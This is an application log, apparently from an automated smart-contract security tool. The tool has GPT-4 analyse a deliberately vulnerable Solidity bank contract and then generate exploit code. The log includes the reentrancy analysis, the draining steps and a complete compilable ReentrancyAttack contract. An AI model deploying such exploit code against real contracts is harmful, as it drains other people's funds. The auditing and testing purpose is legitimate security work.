2025-07-05 13:21:23,847 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-05 13:21:23,850 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:21:23,854 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:21:23,857 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:21:43,579 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:21:43,618 - app.modules.attack_generator - INFO - Received response from OpenAI API in 19.77 seconds
2025-07-05 13:21:43,626 - app.modules.attack_generator - INFO - Contract analysis completed in 19.77 seconds
2025-07-05 13:21:43,627 - app.modules.attack_generator - INFO - Vulnerability assessment: **

- **Reentrancy Vulnerability:**  
  The `withdraw` function sends ETH to `msg.sender` **before**...
2025-07-05 13:21:43,628 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-05 13:21:43,630 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:21:43,631 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:21:43,632 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:21:47,399 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:21:47,419 - app.modules.attack_generator - INFO - Received response from OpenAI API in 3.79 seconds
2025-07-05 13:21:47,425 - app.modules.attack_generator - INFO - Attack code generation completed in 3.79 seconds
2025-07-05 13:21:47,430 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 973
2025-07-05 13:21:47,432 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 23.55 seconds
2025-07-05 13:21:47,434 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-05 13:21:47,439 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp0fiwqf58.sol",\n  "contracts": [\n    {\n      "contract_name": "VulnerableBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "deposit",\n          "outputs": [],\n          "stateMutability": "payable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deposit",\n          "signature": "deposit()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "payable",\n          "payable": true,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw(uint256)",\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99984357320000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 0\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 3000000000000000000\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getBalance": 0\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract VulnerableBank {\\n    mapping(address => uint256) public balances;\\n\\n    // Fonction pour d\\u00e9poser des fonds\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    // Fonction vuln\\u00e9rable de retrait\\n    function withdraw(uint256 _amount) public {\\n        require(balances[msg.sender] >= _amount, \\"Solde insuffisant\\");\\n\\n        // Envoi du montant demand\\u00e9\\n        (bool success, ) = msg.sender.call{value: _amount}(\\"\\");\\n        require(success, unicode\\"\\u00c9chec du transfert\\");\\n\\n        // Mise \\u00e0 jour du solde APR\\u00c8S le transfert\\n        balances[msg.sender] -= _amount;\\n    }\\n\\n    // Consulter le solde\\n    function getBalance() public view returns (uint256) {\\n        return balances[msg.sender];\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. **Contract Analysis:**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increments their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)`.  \n  - Users can check their balance via `getBalance()`.  \n- **Key Code Snippet in `withdraw`:**  \n  ```solidity\n  require(balances[msg.sender] >= _amount, "Solde insuffisant");\n  (bool success, ) = msg.sender.call{value: _amount}("");\n  require(success, "√âchec du transfert");\n  balances[msg.sender] -= _amount;\n  ```\n- The contract holds ETH and user funds, so it is a critical target for security analysis.\n\n---\n\n2. **Vulnerability Assessment:**\n\n- **Reentrancy Vulnerability:**  \n  The `withdraw` function sends ETH to `msg.sender` **before** updating the user‚Äôs balance. This allows a malicious contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated.  \n  - **Mechanism:**  \n    1. Attacker deposits some ETH to have a positive balance.  \n    2. Attacker calls `withdraw` to withdraw some amount.  \n    3. During the external call `(bool success, ) = msg.sender.call{value: _amount}("");`, the attacker‚Äôs fallback or receive function is triggered.  \n    4. In the fallback, the attacker calls `withdraw` again before the balance is decremented.  \n    5. This repeats, draining the contract‚Äôs ETH balance beyond the attacker‚Äôs initial deposit.  \n  - **Impact:**  \n    - Complete or partial draining of the contract‚Äôs ETH balance.  \n    - Loss of user funds and contract insolvency.  \n  - **Additional Notes:**  \n    - The contract uses Solidity 0.8.0, which has built-in overflow checks, so no math overflow/underflow issues here.  \n    - The use of low-level `call` is correct for sending ETH but must be combined with proper state updates to avoid reentrancy.  \n    - No reentrancy guard or checks-effects-interactions pattern is implemented.\n\n- **Other Issues:**  \n  - No access control or withdrawal limits, but this is expected in a bank contract.  \n  - No events emitted on deposits or withdrawals, reducing transparency and auditability (not a security vulnerability but a best practice).  \n  - No protection against flash loan style attacks or economic exploits, but the main critical issue is reentrancy.\n\n---\n\n3. **Exploitation Requirements:**\n\n- **Setup:**  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` on the `VulnerableBank` contract.  \n  - Deposit some ETH into `VulnerableBank` to have a positive balance.  \n- **Attack Steps:**  \n  1. Call `withdraw` from the malicious contract for a certain amount.  \n  2. When the `VulnerableBank` sends ETH back, the fallback in the malicious contract triggers and calls `withdraw` again before the balance is updated.  \n  3. Repeat the reentrant calls until the contract‚Äôs ETH balance is drained or gas runs out.  \n\n---\n\n**Summary:**  \nThe `VulnerableBank` contract is vulnerable to a classic reentrancy attack due to sending ETH before updating the user‚Äôs balance in the `withdraw` function. This can lead to complete loss of funds stored in the contract.\n\n---\n\n**Recommendation:**  \n- Follow the Checks-Effects-Interactions pattern: update the balance **before** sending ETH.  \n- Alternatively, use a reentrancy guard modifier (`nonReentrant`) from OpenZeppelin.  \n- Emit events on deposits and withdrawals for better transparency.', 'contract_analysis': '**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increments their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)`.  \n  - Users can check their balance via `getBalance()`.  \n- **Key Code Snippet in `withdraw`:**  \n  ```solidity\n  require(balances[msg.sender] >= _amount, "Solde insuffisant");\n  (bool success, ) = msg.sender.call{value: _amount}("");\n  require(success, "√âchec du transfert");\n  balances[msg.sender] -= _amount;\n  ```\n- The contract holds ETH and user funds, so it is a critical target for security analysis.\n\n---\n\n2. **', 'vulnerability_assessment': '**\n\n- **Reentrancy Vulnerability:**  \n  The `withdraw` function sends ETH to `msg.sender` **before** updating the user‚Äôs balance. This allows a malicious contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated.  \n  - **Mechanism:**  \n    1. Attacker deposits some ETH to have a positive balance.  \n    2. Attacker calls `withdraw` to withdraw some amount.  \n    3. During the external call `(bool success, ) = msg.sender.call{value: _amount}("");`, the attacker‚Äôs fallback or receive function is triggered.  \n    4. In the fallback, the attacker calls `withdraw` again before the balance is decremented.  \n    5. This repeats, draining the contract‚Äôs ETH balance beyond the attacker‚Äôs initial deposit.  \n  - **Impact:**  \n    - Complete or partial draining of the contract‚Äôs ETH balance.  \n    - Loss of user funds and contract insolvency.  \n  - **Additional Notes:**  \n    - The contract uses Solidity 0.8.0, which has built-in overflow checks, so no math overflow/underflow issues here.  \n    - The use of low-level `call` is correct for sending ETH but must be combined with proper state updates to avoid reentrancy.  \n    - No reentrancy guard or checks-effects-interactions pattern is implemented.\n\n- **Other Issues:**  \n  - No access control or withdrawal limits, but this is expected in a bank contract.  \n  - No events emitted on deposits or withdrawals, reducing transparency and auditability (not a security vulnerability but a best practice).  \n  - No protection against flash loan style attacks or economic exploits, but the main critical issue is reentrancy.\n\n---\n\n3. **', 'exploitation_requirements': '**\n\n- **Setup:**  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` on the `VulnerableBank` contract.  \n  - Deposit some ETH into `VulnerableBank` to have a positive balance.  \n- **Attack Steps:**  \n  1. Call `withdraw` from the malicious contract for a certain amount.  \n  2. When the `VulnerableBank` sends ETH back, the fallback in the malicious contract triggers and calls `withdraw` again before the balance is updated.  \n  3. Repeat the reentrant calls until the contract‚Äôs ETH balance is drained or gas runs out.', 'analysis_duration': 19.76517677307129}, 'attack': {'attack_prompt': '\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: **\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increments their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)`.  \n  - Users can check their balance via `getBalance()`.  \n- **Key Code Snippet in `withdraw`:**  \n  ```solidity\n  require(balances[msg.sender] >= _amount, "Solde insuffisant");\n  (bool success, ) = msg.sender.call{value: _amount}("");\n  require(success, "√âchec du transfert");\n  balances[msg.sender] -= _amount;\n  ```\n- The contract holds ETH and user funds, so it is a critical target for security analysis.\n\n---\n\n2. **\n\nVulnerability Assessment: **\n\n- **Reentrancy Vulnerability:**  \n  The `withdraw` function sends ETH to `msg.sender` **before** updating the user‚Äôs balance. This allows a malicious contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated.  \n  - **Mechanism:**  \n    1. Attacker deposits some ETH to have a positive balance.  \n    2. Attacker calls `withdraw` to withdraw some amount.  \n    3. During the external call `(bool success, ) = msg.sender.call{value: _amount}("");`, the attacker‚Äôs fallback or receive function is triggered.  \n    4. In the fallback, the attacker calls `withdraw` again before the balance is decremented.  \n    5. This repeats, draining the contract‚Äôs ETH balance beyond the attacker‚Äôs initial deposit.  \n  - **Impact:**  \n    - Complete or partial draining of the contract‚Äôs ETH balance.  \n    - Loss of user funds and contract insolvency.  \n  - **Additional Notes:**  \n    - The contract uses Solidity 0.8.0, which has built-in overflow checks, so no math overflow/underflow issues here.  \n    - The use of low-level `call` is correct for sending ETH but must be combined with proper state updates to avoid reentrancy.  \n    - No reentrancy guard or checks-effects-interactions pattern is implemented.\n\n- **Other Issues:**  \n  - No access control or withdrawal limits, but this is expected in a bank contract.  \n  - No events emitted on deposits or withdrawals, reducing transparency and auditability (not a security vulnerability but a best practice).  \n  - No protection against flash loan style attacks or economic exploits, but the main critical issue is reentrancy.\n\n---\n\n3. **\n\nExploitation Requirements: **\n\n- **Setup:**  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` on the `VulnerableBank` contract.  \n  - Deposit some ETH into `VulnerableBank` to have a positive balance.  \n- **Attack Steps:**  \n  1. Call `withdraw` from the malicious contract for a certain amount.  \n  2. When the `VulnerableBank` sends ETH back, the fallback in the malicious contract triggers and calls `withdraw` again before the balance is updated.  \n  3. Repeat the reentrant calls until the contract‚Äôs ETH balance is drained or gas runs out.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named \'attack\', \'exploit\', or \'run\')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n', 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n    function getBalance() external view returns (uint256);\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n    bool internal attacking;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        attacking = true;\n        vulnerableBank.withdraw(attackAmount);\n        attacking = false;\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    receive() external payable {\n        if (attacking && address(vulnerableBank).balance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        }\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n    function getBalance() external view returns (uint256);\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n    bool internal attacking;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        attacking = true;\n        vulnerableBank.withdraw(attackAmount);\n        attacking = false;\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    receive() external payable {\n        if (attacking && address(vulnerableBank).balance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        }\n    }\n}', 'code_type': 'solidity', 'attack_duration': 3.7881009578704834}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp0fiwqf58.sol",\n  "contracts": [\n    {\n      "contract_name": "VulnerableBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "deposit",\n          "outputs": [],\n          "stateMutability": "payable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deposit",\n          "signature": "deposit()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "payable",\n          "payable": true,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw(uint256)",\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99984357320000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 0\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 3000000000000000000\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getBalance": 0\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract VulnerableBank {\\n    mapping(address => uint256) public balances;\\n\\n    // Fonction pour d\\u00e9poser des fonds\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    // Fonction vuln\\u00e9rable de retrait\\n    function withdraw(uint256 _amount) public {\\n        require(balances[msg.sender] >= _amount, \\"Solde insuffisant\\");\\n\\n        // Envoi du montant demand\\u00e9\\n        (bool success, ) = msg.sender.call{value: _amount}(\\"\\");\\n        require(success, unicode\\"\\u00c9chec du transfert\\");\\n\\n        // Mise \\u00e0 jour du solde APR\\u00c8S le transfert\\n        balances[msg.sender] -= _amount;\\n    }\\n\\n    // Consulter le solde\\n    function getBalance() public view returns (uint256) {\\n        return balances[msg.sender];\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. **Contract Analysis:**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increments their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)`.  \n  - Users can check their balance via `getBalance()`.  \n- **Key Code Snippet in `withdraw`:**  \n  ```solidity\n  require(balances[msg.sender] >= _amount, "Solde insuffisant");\n  (bool success, ) = msg.sender.call{value: _amount}("");\n  require(success, "√âchec du transfert");\n  balances[msg.sender] -= _amount;\n  ```\n- The contract holds ETH and user funds, so it is a critical target for security analysis.\n\n---\n\n2. **Vulnerability Assessment:**\n\n- **Reentrancy Vulnerability:**  \n  The `withdraw` function sends ETH to `msg.sender` **before** updating the user‚Äôs balance. This allows a malicious contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated.  \n  - **Mechanism:**  \n    1. Attacker deposits some ETH to have a positive balance.  \n    2. Attacker calls `withdraw` to withdraw some amount.  \n    3. During the external call `(bool success, ) = msg.sender.call{value: _amount}("");`, the attacker‚Äôs fallback or receive function is triggered.  \n    4. In the fallback, the attacker calls `withdraw` again before the balance is decremented.  \n    5. This repeats, draining the contract‚Äôs ETH balance beyond the attacker‚Äôs initial deposit.  \n  - **Impact:**  \n    - Complete or partial draining of the contract‚Äôs ETH balance.  \n    - Loss of user funds and contract insolvency.  \n  - **Additional Notes:**  \n    - The contract uses Solidity 0.8.0, which has built-in overflow checks, so no math overflow/underflow issues here.  \n    - The use of low-level `call` is correct for sending ETH but must be combined with proper state updates to avoid reentrancy.  \n    - No reentrancy guard or checks-effects-interactions pattern is implemented.\n\n- **Other Issues:**  \n  - No access control or withdrawal limits, but this is expected in a bank contract.  \n  - No events emitted on deposits or withdrawals, reducing transparency and auditability (not a security vulnerability but a best practice).  \n  - No protection against flash loan style attacks or economic exploits, but the main critical issue is reentrancy.\n\n---\n\n3. **Exploitation Requirements:**\n\n- **Setup:**  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` on the `VulnerableBank` contract.  \n  - Deposit some ETH into `VulnerableBank` to have a positive balance.  \n- **Attack Steps:**  \n  1. Call `withdraw` from the malicious contract for a certain amount.  \n  2. When the `VulnerableBank` sends ETH back, the fallback in the malicious contract triggers and calls `withdraw` again before the balance is updated.  \n  3. Repeat the reentrant calls until the contract‚Äôs ETH balance is drained or gas runs out.  \n\n---\n\n**Summary:**  \nThe `VulnerableBank` contract is vulnerable to a classic reentrancy attack due to sending ETH before updating the user‚Äôs balance in the `withdraw` function. This can lead to complete loss of funds stored in the contract.\n\n---\n\n**Recommendation:**  \n- Follow the Checks-Effects-Interactions pattern: update the balance **before** sending ETH.  \n- Alternatively, use a reentrancy guard modifier (`nonReentrant`) from OpenZeppelin.  \n- Emit events on deposits and withdrawals for better transparency.', 'reasoning': '**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increments their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)`.  \n  - Users can check their balance via `getBalance()`.  \n- **Key Code Snippet in `withdraw`:**  \n  ```solidity\n  require(balances[msg.sender] >= _amount, "Solde insuffisant");\n  (bool success, ) = msg.sender.call{value: _amount}("");\n  require(success, "√âchec du transfert");\n  balances[msg.sender] -= _amount;\n  ```\n- The contract holds ETH and user funds, so it is a critical target for security analysis.\n\n---\n\n2. **', 'summary': '**\n\n- **Reentrancy Vulnerability:**  \n  The `withdraw` function sends ETH to `msg.sender` **before** updating the user‚Äôs balance. This allows a malicious contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated.  \n  - **Mechanism:**  \n    1. Attacker deposits some ETH to have a positive balance.  \n    2. Attacker calls `withdraw` to withdraw some amount.  \n    3. During the external call `(bool success, ) = msg.sender.call{value: _amount}("");`, the attacker‚Äôs fallback or receive function is triggered.  \n    4. In the fallback, the attacker calls `withdraw` again before the balance is decremented.  \n    5. This repeats, draining the contract‚Äôs ETH balance beyond the attacker‚Äôs initial deposit.  \n  - **Impact:**  \n    - Complete or partial draining of the contract‚Äôs ETH balance.  \n    - Loss of user funds and contract insolvency.  \n  - **Additional Notes:**  \n    - The contract uses Solidity 0.8.0, which has built-in overflow checks, so no math overflow/underflow issues here.  \n    - The use of low-level `call` is correct for sending ETH but must be combined with proper state updates to avoid reentrancy.  \n    - No reentrancy guard or checks-effects-interactions pattern is implemented.\n\n- **Other Issues:**  \n  - No access control or withdrawal limits, but this is expected in a bank contract.  \n  - No events emitted on deposits or withdrawals, reducing transparency and auditability (not a security vulnerability but a best practice).  \n  - No protection against flash loan style attacks or economic exploits, but the main critical issue is reentrancy.\n\n---\n\n3. **', 'code': 'pragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n    function getBalance() external view returns (uint256);\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n    bool internal attacking;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        attacking = true;\n        vulnerableBank.withdraw(attackAmount);\n        attacking = false;\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    receive() external payable {\n        if (attacking && address(vulnerableBank).balance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        }\n    }\n}', 'code_type': 'solidity', 'duration': 23.553277730941772}
2025-07-05 13:21:47,445 - app.services.contract_service - INFO - Has exploit code: True
2025-07-05 13:21:47,447 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-05 13:21:47,449 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-07-05 13:21:47,451 - app.services.contract_service - INFO - Attack strategy summary: **

- **Reentrancy Vulnerability:**  
  The `withdraw` function sends ETH to `msg.sender` **before** updating the user‚Äôs balance. This allows a malicious contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated.  
  - **Mechanism:**  
    1. Attacker deposits some ETH to have a positive balance.  
    2. Attacker calls `withdraw` to withdraw some amount.  
    3. During the external call `(bool success, ) = msg.sender.call{value: _amount}("");`, the attacker‚Äôs fallback or receive function is triggered.  
    4. In the fallback, the attacker calls `withdraw` again before the balance is decremented.  
    5. This repeats, draining the contract‚Äôs ETH balance beyond the attacker‚Äôs initial deposit.  
  - **Impact:**  
    - Complete or partial draining of the contract‚Äôs ETH balance.  
    - Loss of user funds and contract insolvency.  
  - **Additional Notes:**  
    - The contract uses Solidity 0.8.0, which has built-in overflow checks, so no math overflow/underflow issues here.  
    - The use of low-level `call` is correct for sending ETH but must be combined with proper state updates to avoid reentrancy.  
    - No reentrancy guard or checks-effects-interactions pattern is implemented.

- **Other Issues:**  
  - No access control or withdrawal limits, but this is expected in a bank contract.  
  - No events emitted on deposits or withdrawals, reducing transparency and auditability (not a security vulnerability but a best practice).  
  - No protection against flash loan style attacks or economic exploits, but the main critical issue is reentrancy.

---

3. **
2025-07-05 13:21:47,452 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-07-05 13:21:47,453 - app.services.contract_service - INFO - Temporary file /tmp/tmp0fiwqf58.sol removed
2025-07-05 13:21:47,493 - app.api.contract - INFO - Report saved with filename: VulnerableBank_2025-07-05_13-21, status: KO
2025-07-05 13:21:47,495 - app.api.contract - INFO - Analysis completed successfully, returning report
